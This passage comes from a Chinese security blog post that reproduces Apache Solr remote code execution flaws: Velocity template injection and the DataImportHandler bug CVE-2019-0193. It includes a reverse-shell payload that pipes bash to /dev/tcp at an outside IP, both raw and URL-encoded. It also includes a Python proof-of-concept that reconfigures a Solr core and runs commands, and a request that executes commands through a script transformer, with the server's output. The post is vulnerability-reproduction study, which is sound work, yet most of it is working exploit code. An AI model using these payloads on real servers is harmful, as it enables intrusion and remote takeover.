+<h6 id="同理上面的shell就是这样构造的"><a href="#同理上面的shell就是这样构造的" class="headerlink" title="同理上面的shell就是这样构造的"></a>同理上面的shell就是这样构造的</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;)+#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))+#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))+#set($str=$x.class.forName(&apos;java.lang.String&apos;))+#set($ex=$rt.getRuntime().exec(&apos;bash -c &quot;bash -i &gt;/dev/tcp/123.57.232.69/8080 0&gt;&amp;1&quot;&apos;))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">编码后的</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash%20-c%20%22bash%20-i%20&gt;/dev/tcp/123.57.232.69/8080%200&gt;%261%22%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+
+<h6 id="同时贴出poc的脚本"><a href="#同时贴出poc的脚本" class="headerlink" title="同时贴出poc的脚本"></a>同时贴出poc的脚本</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] Get core name."</span></span><br><span class="line">    url += <span class="string">"/solr/admin/cores?wt=json&amp;indexInfo=false"</span></span><br><span class="line">    conn = requests.request(<span class="string">"GET"</span>, url=url)</span><br><span class="line">    name = <span class="string">"test"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = list(json.loads(conn.text)[<span class="string">"status"</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_config</span><span class="params">(url, name)</span>:</span></span><br><span class="line"></span><br><span class="line">    url += <span class="string">"/solr/"</span>+name+<span class="string">"/config"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] Update config."</span>, url</span><br><span class="line">    headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">               <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>&#125;</span><br><span class="line">    post_data = <span class="string">"""</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      "update-queryresponsewriter": &#123;</span></span><br><span class="line"><span class="string">        "startup": "lazy",</span></span><br><span class="line"><span class="string">        "name": "velocity",</span></span><br><span class="line"><span class="string">        "class": "solr.VelocityResponseWriter",</span></span><br><span class="line"><span class="string">        "template.base.dir": "",</span></span><br><span class="line"><span class="string">        "solr.resource.loader.enabled": "true",</span></span><br><span class="line"><span class="string">        "params.resource.loader.enabled": "true"</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    conn = requests.request(<span class="string">"POST"</span>, url, data=post_data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> conn.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"update config error: "</span>, conn.status_code</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    core_name = get_name(url)</span><br><span class="line">    update_config(url, core_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] Start get ."</span></span><br><span class="line">    url += <span class="string">"/solr/"</span>+core_name+<span class="string">"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ifconfig%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br><span class="line">    conn = requests.request(<span class="string">"GET"</span>, url)</span><br><span class="line">    <span class="keyword">print</span> conn.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>：</span><br><span class="line">    <span class="comment"># print sys.argv[0], "http://192.168.157.138/"</span></span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    poc(target)</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h5><h6 id="https-github-com-wyzxxz-Apache-Solr-RCE-via-Velocity-template"><a href="#https-github-com-wyzxxz-Apache-Solr-RCE-via-Velocity-template" class="headerlink" title="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template"></a><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></h6><h6 id="漏洞分析-Apache-Solr-模版注入漏洞-RCE"><a href="#漏洞分析-Apache-Solr-模版注入漏洞-RCE" class="headerlink" title="漏洞分析 - Apache Solr 模版注入漏洞(RCE)"></a><a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">漏洞分析 - Apache Solr 模版注入漏洞(RCE)</a></h6><h6 id="服务器端模板注入"><a href="#服务器端模板注入" class="headerlink" title="服务器端模板注入"></a><a href="http://www.xmrseo.com/?post=147" target="_blank" rel="noopener">服务器端模板注入</a></h6><h6 id="http-www-blogjava-net-sxyx2008-archive-2010-11-11-337799-html"><a href="#http-www-blogjava-net-sxyx2008-archive-2010-11-11-337799-html" class="headerlink" title="http://www.blogjava.net/sxyx2008/archive/2010/11/11/337799.html"></a><a href="http://www.blogjava.net/sxyx2008/archive/2010/11/11/337799.html" target="_blank" rel="noopener">http://www.blogjava.net/sxyx2008/archive/2010/11/11/337799.html</a></h6><h6 id="https-gist-githubusercontent-com-s00py-a1ba36a3689fa13759ff910e179fc133-raw-fae5e663ffac0e3996fd9dbb89438310719d347a"><a href="#https-gist-githubusercontent-com-s00py-a1ba36a3689fa13759ff910e179fc133-raw-fae5e663ffac0e3996fd9dbb89438310719d347a" class="headerlink" title="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/"></a><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></h6><h6 id="Apache-Solr-Velocity模板注入RCE漏洞复现"><a href="#Apache-Solr-Velocity模板注入RCE漏洞复现" class="headerlink" title="Apache Solr Velocity模板注入RCE漏洞复现"></a><a href="https://www.cnblogs.com/dddjh/p/11805862.html" target="_blank" rel="noopener">Apache Solr Velocity模板注入RCE漏洞复现</a></h6><h6 id="https-www-freebuf-com-vuls-218730-html"><a href="#https-www-freebuf-com-vuls-218730-html" class="headerlink" title="https://www.freebuf.com/vuls/218730.html"></a><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a></h6><h6 id="https-www-cnblogs-com-yuzly-p-11782608-html"><a href="#https-www-cnblogs-com-yuzly-p-11782608-html" class="headerlink" title="https://www.cnblogs.com/yuzly/p/11782608.html"></a><a href="https://www.cnblogs.com/yuzly/p/11782608.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11782608.html</a></h6><h6 id="https-two8g-gitbooks-io-solr-reference-guide-start-run-html"><a href="#https-two8g-gitbooks-io-solr-reference-guide-start-run-html" class="headerlink" title="https://two8g.gitbooks.io/solr-reference-guide/start/run.html"></a><a href="https://two8g.gitbooks.io/solr-reference-guide/start/run.html" target="_blank" rel="noopener">https://two8g.gitbooks.io/solr-reference-guide/start/run.html</a></h6><h5 id="0x02-Apache-Solr-DataImportHandler-远程代码执行漏洞-CVE-2019-0193-分析"><a href="#0x02-Apache-Solr-DataImportHandler-远程代码执行漏洞-CVE-2019-0193-分析" class="headerlink" title="0x02 Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193)分析"></a>0x02 Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193)分析</h5><h5 id="漏洞复现的环境和漏洞的描述请看下面的参考资料一栏"><a href="#漏洞复现的环境和漏洞的描述请看下面的参考资料一栏" class="headerlink" title="漏洞复现的环境和漏洞的描述请看下面的参考资料一栏"></a>漏洞复现的环境和漏洞的描述请看下面的参考资料一栏</h5><h6 id="下面是构造数据回显"><a href="#下面是构造数据回显" class="headerlink" title="下面是构造数据回显"></a>下面是构造数据回显</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/test/dataimport?dataConfig=%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20/%3E%0A%3Cscript%3E%3C%21%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc%28row%29%7B%0A%20%20%20%20%20%20%20%20var%20j%3Dnew%20java.io.BufferedReader%28new%20java.io.InputStreamReader%28java.lang.Runtime.getRuntime%28%29.exec%28%22ls%22%29.getInputStream%28%29%29%29%3B%0A%20%20%20%20%20%20%20%20var%20line%3Dj.readLine%28%29%3B%0A%20%20%20%20%20%20%20%20var%20res%3D%22%22%3B%0A%20%20%20%20%20%20%20%20while%28line%21%3Dnull%20%26%26%20line%21%3Dundefined%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20res%3Dres%2Bline%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line%3Dj.readLine%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%09%09row.put%28%22title_s%22%2Cres%29%3B%0A%09%09return%20row%3B%0A%09%7D%0A%20%20%5D%5D%3E%3C/script%3E%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22/books/book%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22res_s%22%20template%3D%22some%20static%20payload%22/%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title_s%22%20xpath%3D%22/books/book/name%22/%3E%0A%20%20%20%20%3C/entity%3E%0A%3C/document%3E%0A%3C/dataConfig%3E&amp;command=full-import&amp;debug=true HTTP/1.1</span><br><span class="line">Host: 123.57.232.69:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application/xml</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 135</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://123.57.232.69:8983/solr/</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;books&gt;</span><br><span class="line"> &lt;book&gt;</span><br><span class="line"> &lt;name&gt;NAME1&lt;/name&gt;</span><br><span class="line"> &lt;/book&gt;</span><br><span class="line"> &lt;book&gt;</span><br><span class="line">&lt;name&gt;NAME2&lt;/name&gt;</span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;/books&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="回显的结果如下："><a href="#回显的结果如下：" class="headerlink" title="回显的结果如下："></a>回显的结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Content-Length: 738</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;responseHeader&quot;:&#123;</span><br><span class="line">    &quot;status&quot;:0,</span><br><span class="line">    &quot;QTime&quot;:381&#125;,</span><br><span class="line">  &quot;initArgs&quot;:[</span><br><span class="line">    &quot;defaults&quot;,[</span><br><span class="line">      &quot;config&quot;,&quot;db-data-config.xml&quot;]],</span><br><span class="line">  &quot;command&quot;:&quot;full-import&quot;,</span><br><span class="line">  &quot;mode&quot;:&quot;debug&quot;,</span><br><span class="line">  &quot;documents&quot;:[&#123;</span><br><span class="line">      &quot;title_s&quot;:[&quot;README.txtcontextsetcliblogsmodulesresourcesscriptssolrsolr-webappstart.jar&quot;]&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;title_s&quot;:[&quot;README.txtcontextsetcliblogsmodulesresourcesscriptssolrsolr-webappstart.jar&quot;]&#125;],</span><br><span class="line">  &quot;verbose-output&quot;:[],</span><br><span class="line">  &quot;status&quot;:&quot;idle&quot;,</span><br><span class="line">  &quot;importResponse&quot;:&quot;&quot;,</span><br><span class="line">  &quot;statusMessages&quot;:&#123;</span><br><span class="line">    &quot;Total Requests made to DataSource&quot;:&quot;0&quot;,</span><br><span class="line">    &quot;Total Rows Fetched&quot;:&quot;2&quot;,</span><br><span class="line">    &quot;Total Documents Processed&quot;:&quot;0&quot;,</span><br><span class="line">    &quot;Total Documents Skipped&quot;:&quot;0&quot;,</span><br><span class="line">    &quot;Full Dump Started&quot;:&quot;2019-11-24 06:27:42&quot;,</span><br><span class="line">    &quot;Total Documents Failed&quot;:&quot;2&quot;,</span><br><span class="line">    &quot;Time taken&quot;:&quot;0:0:0.366&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><h6 id="Apache-Solr-DataImportHandler-远程代码执行漏洞-CVE-2019-0193-分析"><a href="#Apache-Solr-DataImportHandler-远程代码执行漏洞-CVE-2019-0193-分析" class="headerlink" title="Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析"></a><a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析</a></h6><h6 id="https-mp-weixin-qq-com-s-typLOXZCev-9WH-Ux0s6oA"><a href="#https-mp-weixin-qq-com-s-typLOXZCev-9WH-Ux0s6oA" class="headerlink" title="https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA"></a><a href="https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA</a></h6><h6 id="Apache-Solr-远程命令执行漏洞-CVE-2019-0193-漏洞复现环境"><a href="#Apache-Solr-远程命令执行漏洞-CVE-2019-0193-漏洞复现环境" class="headerlink" title="Apache Solr 远程命令执行漏洞(CVE-2019-0193)漏洞复现环境"></a><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">Apache Solr 远程命令执行漏洞(CVE-2019-0193)漏洞复现环境</a></h6><h6 id="https-xz-aliyun-com-t-4422"><a href="#https-xz-aliyun-com-t-4422" class="headerlink" title="https://xz.aliyun.com/t/4422"></a><a href="https://xz.aliyun.com/t/4422" target="_blank" rel="noopener">https://xz.aliyun.com/t/4422</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/21/ASIS-2019-Final的部分web题解/" rel="next" title="ASIS 2019 Final的部分web题解">
+                <i class="fa fa-chevron-left"></i> ASIS 2019 Final的部分web题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Apache-Solr介绍"><span class="nav-number">1.0.1.</span> <span class="nav-text">Apache Solr介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Solr是一个独立的企业级搜索应用服务器-它对外提供类似于web-service的API接口-用户可以通过http请求-向搜索引擎服务器提交一定格式的XML文件-生成索引-也可以通过http-get操作提出查找请求-并得到XML格式的返回结果。"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.0.2.</span> <span class="nav-text">漏洞描述</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Solr中存在VelocityResponseWriter组件-攻击者可以构造特定请求修改相关配置-使VelocityResponseWriter组件允许加载指定模板-进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞产生原因"><span class="nav-number">1.0.3.</span> <span class="nav-text">漏洞产生原因:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#当攻击者可以直接访问Solr控制台时，可以通过发送类似-节点名-config的POST请求对该节点的配置文件做更改Apache-Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params-resource-loader-enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params-resource-loader-enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞影响版本"><span class="nav-number">1.0.4.</span> <span class="nav-text">漏洞影响版本</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache-Solr-5-x-8-2-0，存在config-API版本"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">Apache Solr 5.x - 8.2.0，存在config API版本</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞环境的搭建"><span class="nav-number">1.0.5.</span> <span class="nav-text">漏洞环境的搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-安装java环境"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">1. 安装java环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-下载Apache-Solr-8-2-0-下载地址-https-www-apache-org-dyn-closer-lua-lucene-solr-8-2-0-solr-8-2-0-zip"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">2. 下载Apache Solr 8.2.0,下载地址: https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-解压然后进入bin目录执行solr-cmd-start"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">3. 解压然后进入bin目录执行solr.cmd start</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-浏览器访问192-168-10-171-8983，环境搭建成功"><span class="nav-number">1.0.5.4.</span> <span class="nav-text">4. 浏览器访问192.168.10.171:8983，环境搭建成功</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.0.6.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-重新启动-再次访问192-168-10-171-8983-solr发现没有创建core-先手动在-server-solr-目录下创建一个test的文件夹，然后将-server-solr-configsets-default-下的conf目录拷贝到test目录下"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">1. 重新启动,再次访问192.168.10.171:8983/solr发现没有创建core, 先手动在/server/solr/目录下创建一个test的文件夹，然后将/server/solr/configsets/_default/下的conf目录拷贝到test目录下</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-然后按照下图所示创建一个名为test的core"><span class="nav-number">1.0.6.2.</span> <span class="nav-text">2. 然后按照下图所示创建一个名为test的core</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-然后访问查看该应用config文件是否可以访问"><span class="nav-number">1.0.6.3.</span> <span class="nav-text">3. 然后访问查看该应用config文件是否可以访问</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-Apache-Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params-resource-loader-enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。"><span class="nav-number">1.0.6.4.</span> <span class="nav-text">4. Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-接下来我们就可以构造payload来实现RCE"><span class="nav-number">1.0.6.5.</span> <span class="nav-text">5. 接下来我们就可以构造payload来实现RCE</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Payload如下："><span class="nav-number">1.0.6.6.</span> <span class="nav-text">Payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是执行得到shell的payload-Burp-Suite"><span class="nav-number">1.0.6.7.</span> <span class="nav-text">下面是执行得到shell的payload(Burp Suite)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面直接反弹shell到你自己的服务器上"><span class="nav-number">1.0.6.8.</span> <span class="nav-text">下面直接反弹shell到你自己的服务器上</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#复现完成之后我们了解了相关的模板注入："><span class="nav-number">1.0.6.9.</span> <span class="nav-text">复现完成之后我们了解了相关的模板注入：</span></a></li><li class="nav-item nav-level-6"><a 